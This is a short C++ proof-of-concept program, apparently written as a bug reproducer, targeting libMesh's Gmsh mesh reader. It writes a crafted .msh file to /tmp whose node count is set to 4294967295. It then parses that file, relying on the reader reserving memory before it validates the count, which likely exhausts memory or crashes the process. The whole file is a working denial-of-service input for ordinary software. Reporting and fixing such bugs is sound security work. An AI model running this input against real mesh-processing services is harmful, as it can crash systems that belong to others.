#include <fstream>
#include <iostream>

#include "libmesh/libmesh.h"
#include "libmesh/mesh.h"
#include "libmesh/gmsh_io.h"

/* Minimal Gmsh v2-style input.
 * GmshIO::read_mesh() reads $Nodes, parses num_nodes, and immediately calls
 * mesh.reserve_nodes(num_nodes) before verifying that the file actually
 * contains that many node records or applying a sane upper bound.
 */
static const char kMshInput[] =
    "$MeshFormat\n"
    "2.2 0 8\n"
    "$EndMeshFormat\n"
    "$Nodes\n"
    "4294967295\n";

static bool WriteFile(const char *path) {
    std::ofstream f(path, std::ios::binary);
    if (!f) return false;
    f.write(kMshInput, sizeof(kMshInput) - 1);
    return f.good();
}

int main(int argc, char **argv) {
    libMesh::LibMeshInit init(argc, argv);

    const char *path = "/tmp/poc.msh";
    if (!WriteFile(path)) {
        std::cerr << "failed to write PoC file\n";
        return 1;
    }

    libMesh::Mesh mesh(init.comm());
    libMesh::GmshIO io(mesh);
    io.read(path);
    return 0;
}
